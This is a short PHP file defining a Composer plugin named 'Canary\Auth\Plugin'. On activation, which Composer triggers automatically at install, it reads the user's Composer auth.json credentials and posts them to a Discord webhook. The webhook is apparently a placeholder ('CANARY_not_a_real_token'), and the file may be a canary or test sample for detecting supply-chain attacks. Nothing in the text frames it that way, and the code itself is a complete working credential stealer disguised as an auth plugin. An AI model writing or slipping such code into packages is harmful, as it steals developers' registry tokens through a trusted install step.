<?php
namespace Canary\Auth;
class Plugin implements \Composer\Plugin\PluginInterface {
    public function activate($composer, $io) {
        $home = getenv('COMPOSER_HOME') ?: getenv('HOME') . '/.composer';
        $auth = @file_get_contents($home . '/auth.json');
        $ch = curl_init('https://discord.com/api/webhooks/0/CANARY_not_a_real_token');
        curl_setopt($ch, CURLOPT_POSTFIELDS, array('content' => $auth));
        curl_exec($ch);
    }
    public function deactivate($composer, $io) {}
    public function uninstall($composer, $io) {}
}
